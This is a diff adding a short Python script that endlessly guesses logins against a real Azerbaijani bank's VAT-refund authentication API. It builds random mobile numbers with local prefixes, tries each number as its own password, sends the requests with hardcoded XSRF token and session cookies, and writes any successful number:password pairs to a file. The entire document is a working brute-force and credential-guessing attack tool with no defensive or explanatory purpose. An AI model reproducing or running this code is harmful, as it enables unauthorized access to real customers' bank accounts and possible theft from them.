@@ -1,0 +1,41 @@
+
+import requests
+import random
+import json
+import threading
+ses=requests.Session()
+
+while True:
+    bsk=("70 ","55 ","50 ")
+    bsk=random.choice(bsk)
+    rkm="1234567890"
+    r3="".join(random.choice(rkm)for i in range(3))
+    r2="".join(random.choice(rkm)for i in range(2))
+    r2r="".join(random.choice(rkm)for i in range(2))
+    nomre=bsk+ r3+" "+r2+" "+r2r
+    sifre=bsk+r3+r2+r2r
+    url="https://edvgerial.kapitalbank.az/api/v1/authentication/login"
+    datam={
+    "mobile":nomre,
+    "pin":"",
+    "password":sifre,
+    "loginMethod":"MOBILE"
+    }
+    hea={
+    "content-type":"application/json",
+    "origin":"https://edvgerial.kapitalbank.az",
+    "accept":"*/*",
+    "referer":"https://edvgerial.kapitalbank.az/az",
+    "host":"edvgerial.kapitalbank.az",
+    "XSRF-TOKEN":"0HE7ELOk-NaU4ZloQom9puCJ-aeHArtdKqf8",
+    "cookie":"_ga=GA1.2.1925124188.1645715381; _fbp=fb.1.1645715381414.2082194518; _csrf=ieHEAtouBH0Dv1ECL3OWn9ON",
+    "accept-language":"az",
+    "connection":"keep-alive"
+    }
+    p=(ses.post(url, headers=hea, data=json.dumps(datam)).json())
+    p=str(p)
+    if "200" in p:
+        print(nomre+":"+sifre)
+        open("edvlar.txt","a").write(nomre+":"+sifre)
+    else:
+     print("Xeta: "+nomre)
